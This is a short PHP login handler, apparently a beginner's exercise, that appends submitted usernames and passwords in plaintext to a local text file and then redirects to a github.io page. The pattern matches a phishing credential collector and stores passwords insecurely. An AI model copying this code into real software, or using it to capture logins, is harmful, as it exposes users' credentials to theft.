<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Buat string data yang akan disimpan ke dalam file txt
    $data = "Username: " . $username . "\n" . "Password: " . $password . "\n\n";

    // Buka file txt untuk menambahkan data login
    $file = fopen("C:/Users/SERVER/Documents/Belajar HTML/login_data.txt", "a");

    // Tulis data login ke dalam file txt
    fwrite($file, $data);

    // Tutup file txt setelah selesai menulis
    fclose($file);

    // Beri respon kembali ke halaman login
    header("Location: https://rizzzky.github.io/HTML/index.html");
    exit();
}
?>
